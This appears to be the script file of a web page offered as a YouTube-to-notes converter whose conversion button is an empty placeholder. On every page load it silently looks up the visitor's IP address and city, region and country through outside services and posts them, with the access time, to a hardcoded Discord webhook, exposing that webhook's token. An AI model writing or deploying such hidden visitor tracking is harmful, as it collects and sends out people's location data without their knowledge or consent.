document.addEventListener("DOMContentLoaded", async () => {
    // Log user access data
    logAccessData();

    // Button functionality to convert YouTube video to notes
    document.getElementById("convert-btn").addEventListener("click", () => {
        const videoUrl = document.getElementById("video-url").value;
        // Call backend for notes conversion
        // Add your conversion logic here
    });
});

async function logAccessData() {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    const ip = data.ip;

    // Fetch additional location data using ipinfo.io (or similar API)
    const locationResponse = await fetch(`https://ipinfo.io/${ip}/json?token=YOUR_IPINFO_TOKEN`);
    const locationData = await locationResponse.json();
    const { city, region, country } = locationData;

    // Log the information to Discord
    const webhookURL = 'https://discord.com/api/webhooks/1294182161842438215/ISyYd61dcdpPE-xeeFNSpcEtBi-G1RC1RdzdV5B6flgcvrDwkcgIqvV_scUqUOsd1fPJ';
    const timeAccessed = new Date().toISOString();

    const embedData = {
        content: null,
        embeds: [{
            title: "New Log",
            fields: [
                { name: "IP Address", value: ip },
                { name: "Location", value: `${city}, ${region}, ${country}` },
                { name: "Time Accessed", value: timeAccessed }
            ],
            color: 5814783
        }]
    };

    await fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(embedData)
    });
}
